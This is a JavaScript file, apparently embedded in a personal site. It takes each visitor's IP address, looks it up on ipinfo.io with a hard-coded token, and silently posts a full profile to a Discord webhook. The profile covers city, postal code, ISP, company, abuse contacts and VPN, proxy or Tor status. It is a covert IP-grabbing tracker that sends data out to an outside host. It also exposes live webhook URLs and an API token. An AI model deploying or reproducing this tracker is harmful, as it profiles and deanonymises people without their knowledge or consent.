var userIP;

function monke(json) {
    userIP = json.ip; // Store the user's IP in a variable
    var request = new XMLHttpRequest();

    // Make a request to ipinfo.io with the user's IP
    request.open("GET", "https://ipinfo.io/" + userIP + "?token=deb0bdf9909673");

    request.onreadystatechange = function () {
        if (request.readyState == 4 && request.status == 200) {
            var ipInfo = JSON.parse(request.responseText);

            // Use the additional information from the ipinfo.io response
            var params = {
                username: "trim.is-a.dev",
                avatar_url: "https://discord.com/api/webhooks/1180275419019219026/EHLli37P-St1gS4POhdAq1knO9MdquqI38mt1c2d1hHMQskXsvCseppWsj4r0WDduavp",
                embeds: [{
                    title: "trim.is-a.dev",
                    color: 15000,
                    description: `**IP:** \`${ipInfo.ip || "N/A"}\`\n` +
                        `**Hostname:** \`${ipInfo.hostname || "N/A"}\`\n` +
                        `**City:** \`${ipInfo.city || "N/A"}\`\n` +
                        `**Region:** \`${ipInfo.region || "N/A"}\`\n` +
                        `**Country:** \`${ipInfo.country || "N/A"}\`\n` +
                        `**Postal Code:** \`${ipInfo.postal || "N/A"}\`\n` +
                        `**Timezone:** \`${ipInfo.timezone || "N/A"}\`\n` +
                        `**Anycast:** ${ipInfo.anycast ? "Yes" : "No"}\n` +
                        `**ASN:** \`${ipInfo.asn && ipInfo.asn.asn ? ipInfo.asn.asn : "N/A"}\`\n` +
                        `**ASN Name:** \`${ipInfo.asn && ipInfo.asn.name ? ipInfo.asn.name : "N/A"}\`\n` +
                        `**ASN Domain:** \`${ipInfo.asn && ipInfo.asn.domain ? ipInfo.asn.domain : "N/A"}\`\n` +
                        `**ASN Route:** \`${ipInfo.asn && ipInfo.asn.route ? ipInfo.asn.route : "N/A"}\`\n\n` +
                        `**Company:** \`${ipInfo.company && ipInfo.company.name ? ipInfo.company.name : "N/A"}\`\n` +
                        `**Company Domain:** \`${ipInfo.company && ipInfo.company.domain ? ipInfo.company.domain : "N/A"}\`\n` +
                        `**Company Type:** \`${ipInfo.company && ipInfo.company.type ? ipInfo.company.type : "N/A"}\`\n\n` +
                        `**Abuse Address:** \`${ipInfo.abuse && ipInfo.abuse.address ? ipInfo.abuse.address : "N/A"}\`\n` +
                        `**Abuse Country:** \`${ipInfo.abuse && ipInfo.abuse.country ? ipInfo.abuse.country : "N/A"}\`\n` +
                        `**Abuse Email:** \`${ipInfo.abuse && ipInfo.abuse.email ? ipInfo.abuse.email : "N/A"}\`\n` +
                        `**Abuse Phone:** \`${ipInfo.abuse && ipInfo.abuse.phone ? ipInfo.abuse.phone : "N/A"}\`\n\n` +
                        `**Domains Total:** \`${ipInfo.domains && ipInfo.domains.total ? ipInfo.domains.total : "N/A"}\`\n` +
                        `**Domains List:** ${ipInfo.domains && ipInfo.domains.domains ? ipInfo.domains.domains.map(domain => `\n- ${domain}`).join("") : "N/A"}\n\n` +
                        `**Privacy:**\n` +
                        ` - VPN: ${ipInfo.privacy && ipInfo.privacy.vpn ? "Yes" : "No"}\n` +
                        ` - Proxy: ${ipInfo.privacy && ipInfo.privacy.proxy ? "Yes" : "No"}\n` +
                        ` - Tor: ${ipInfo.privacy && ipInfo.privacy.tor ? "Yes" : "No"}\n` +
                        ` - Relay: ${ipInfo.privacy && ipInfo.privacy.relay ? "Yes" : "No"}\n` +
                        ` - Hosting: ${ipInfo.privacy && ipInfo.privacy.hosting ? "Yes" : "No"}\n` +
                        ` - Service: \`${ipInfo.privacy && ipInfo.privacy.service ? ipInfo.privacy.service : "N/A"}\``
                }]
            };

            try {
                // Send the Discord webhook request with the extended information
                var discordRequest = new XMLHttpRequest();
                discordRequest.open("POST", "https://discord.com/api/webhooks/1175547384885936178/bkarNNbE8OG8i8NL-qfkAeHXK0bWAOZpimr9rpb1WRyub166xuC_InNXtKNXYg-FosNB");
                discordRequest.setRequestHeader('Content-type', 'application/json');
                discordRequest.send(JSON.stringify(params));
            } catch (error) {
                console.error("Error sending Discord request:", error);
            }
        }
    };

    try {
        request.send();
    } catch (error) {
        console.error("Error sending ipinfo.io request:", error);
    }
}